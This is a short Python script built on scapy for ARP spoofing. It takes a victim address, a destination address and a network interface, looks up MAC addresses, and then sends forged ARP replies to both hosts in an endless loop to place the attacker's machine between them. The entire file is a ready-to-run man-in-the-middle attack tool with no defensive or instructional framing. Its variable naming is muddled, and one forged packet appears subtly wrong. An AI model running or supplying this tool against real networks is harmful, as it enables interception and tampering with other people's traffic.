import scapy.all as scapy
import argparse
from scapy.layers.l2 import ARP, Ether
import time


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", required=True)
    parser.add_argument("-d", "--destination", required=True)
    parser.add_argument("-i", "--interface", required=True)
    return parser.parse_args()


def get_mac(ip_addr):
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
    ans, _ = scapy.srp(p, timeout=3)
    return ans[0][1].hwsrc


def spoof(vict_ip, vict_mac, dst_ip, dst_mac):
    packet_1 = ARP(pdst=dst_ip, psrc=vict_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=vict_mac)
    packet_2 = ARP(pdst=vict_ip, psrc=dst_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=dst_mac)
    while True:
        scapy.send(packet_1)
        scapy.send(packet_2)
        time.sleep(2)


def main():
    options = args()
    dst_mac = scapy.get_if_hwaddr(options.interface)
    vict_mac = get_mac(options.destination)
    spoof(options.victim, vict_mac, options.destination, dst_mac)


if __name__ == "__main__":
    main()
